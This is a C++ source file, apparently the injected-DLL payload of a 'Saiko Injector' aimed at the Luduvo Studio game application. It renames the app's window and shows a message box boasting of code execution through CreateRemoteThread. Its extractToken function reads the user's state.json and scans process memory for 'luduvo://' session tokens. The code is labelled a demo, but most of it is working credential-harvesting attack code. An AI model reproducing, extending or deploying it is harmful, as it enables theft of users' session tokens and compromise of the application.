#include "troll.h"
#include "../shared/shared.h"
#include <Windows.h>
#include <ShlObj.h>
#include <cstdio>
#include <cstring>
#include <string>

// Window Hijack
void hijackWindowTitle() {
    // Enumerate all top-level windows in our process
    struct EnumData {
        DWORD pid;
        HWND found;
    } data = { GetCurrentProcessId(), NULL };

    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        auto* d = (EnumData*)lParam;
        DWORD pid = 0;
        GetWindowThreadProcessId(hwnd, &pid);
        if (pid == d->pid && IsWindowVisible(hwnd)) {
            WCHAR title[256];
            if (GetWindowTextW(hwnd, title, 256) > 0) {
                // Find the main Luduvo Studio window
                if (wcsstr(title, L"Luduvo") || wcsstr(title, L"Studio")) {
                    d->found = hwnd;
                    return FALSE; // stop enum
                }
            }
        }
        return TRUE;
    }, (LPARAM)&data);

    if (data.found) {
        WCHAR origTitle[512];
        GetWindowTextW(data.found, origTitle, 512);
        SetWindowTextW(data.found,
            L"Saiko Injector Demo");
        debug_log(L"[saiko] Window title hijacked! Original: '%s'\n", origTitle);
    } else {
        debug_log(L"[saiko] Could not find Luduvo main window\n");
    }
}

// Proof MessageBox
void showProofMessageBox() {
    const char* msg =
        "-- Saiko Injector --\r\n"
        "\r\n"
        "This message was displayed from INSIDE LuduvoApp.exe\r\n"
        "via a DLL injected using CreateRemoteThread.\r\n"
        "\r\n"
        "What it can do:\r\n"
        "  - Remap any keybind at runtime\r\n"
        "  - Execute arbitrary Lua/Luau code\r\n"
        "  - Access the ECS game world\r\n"
        "  - Extract session data\r\n"
        "  - Hijack any Qt widget\r\n"
        "  - Intercept keyboard input (WH_KEYBOARD_LL)\r\n"
        "\r\n";

    MessageBoxA(NULL, msg, "Saiko was here", MB_OK | MB_ICONINFORMATION);
}

const char* extractToken() {
    static char result[1024] = {};
    const char* paths[] = {
        nullptr, // TBD
        nullptr
    };

    WCHAR localAppData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        WCHAR statePath[MAX_PATH];
        swprintf_s(statePath, L"%s\\Luduvo\\state.json", localAppData);

        HANDLE hFile = CreateFileW(statePath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD size = GetFileSize(hFile, NULL);
            if (size > 0 && size < 2000) {
                char* buf = new char[size + 1];
                DWORD read = 0;
                ReadFile(hFile, buf, size, &read, NULL);
                buf[read] = 0;
                snprintf(result, sizeof(result),
                    "State file found at %%LOCALAPPDATA%%\\Luduvo\\state.json:\n%s", buf);
                delete[] buf;
            }
            CloseHandle(hFile);
        }
    }

    if (result[0] == 0) {
        // Try to scan for luduvo:// pattern in process memory
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        unsigned char* start = (unsigned char*)si.lpMinimumApplicationAddress;
        unsigned char* end   = (unsigned char*)si.lpMaximumApplicationAddress;

        const char* pattern = "luduvo://";
        int patLen = 9;
        int found = 0;

        // just sample memory regions
        MEMORY_BASIC_INFORMATION mbi;
        for (unsigned char* addr = start; addr < end && found < 3;) {
            if (VirtualQuery(addr, &mbi, sizeof(mbi)) == 0) break;
            if (mbi.State == MEM_COMMIT &&
                (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) {
                unsigned char* regionEnd = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
                unsigned char* scanEnd = min(regionEnd, (unsigned char*)mbi.BaseAddress + 0x100000);
                for (unsigned char* p = (unsigned char*)mbi.BaseAddress; p < scanEnd - patLen; p++) {
                    if (memcmp(p, pattern, patLen) == 0) {
                        char token[256] = {};
                        int j = 0;
                        for (int i = 0; i < 250 && p[patLen + i] > 0x1F && p[patLen + i] < 0x7F; i++) {
                            if (p[patLen + i] == '/' && j > 0) break;
                            token[j++] = p[patLen + i];
                        }
                        token[j] = 0;
                        char line[300];
                        snprintf(line, sizeof(line), "Found luduvo:// URI at 0x%p: luduvo://%s\n",
                                 (void*)p, token);
                        strcat_s(result, sizeof(result), line);
                        found++;
                        p += patLen + j + 10;
                    }
                }
            }
            addr = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
        }

        if (found == 0) {
            snprintf(result + strlen(result), sizeof(result) - strlen(result),
                "No luduvo:// tokens found in process memory.\n");
        }
    }

    snprintf(result + strlen(result), sizeof(result) - strlen(result),
        "\nend");
    return result;
}

// State JSON
const char* getStateJson() {
    static char buf[4096] = {};
    WCHAR localAppData[MAX_PATH];

    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        WCHAR statePath[MAX_PATH];
        swprintf_s(statePath, L"%s\\Luduvo\\state.json", localAppData);

        HANDLE hFile = CreateFileW(statePath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD size = GetFileSize(hFile, NULL);
            if (size > 0 && size < 4000) {
                DWORD read = 0;
                ReadFile(hFile, buf, min(size, 4000), &read, NULL);
                buf[read] = 0;
            } else {
                snprintf(buf, sizeof(buf), "state.json exists but is %lu bytes\n", size);
            }
            CloseHandle(hFile);
        } else {
            snprintf(buf, sizeof(buf), "No state.json found at %S\n", statePath);
        }
    } else {
        snprintf(buf, sizeof(buf), "Could not resolve LOCALAPPDATA\n");
    }
    return buf;
}

void runDemo() {
    debug_log(L"[saiko] Starting demo...\n");

    hijackWindowTitle();

    showProofMessageBox();

    debug_log(L"[saiko] Demo complete.\n");
}
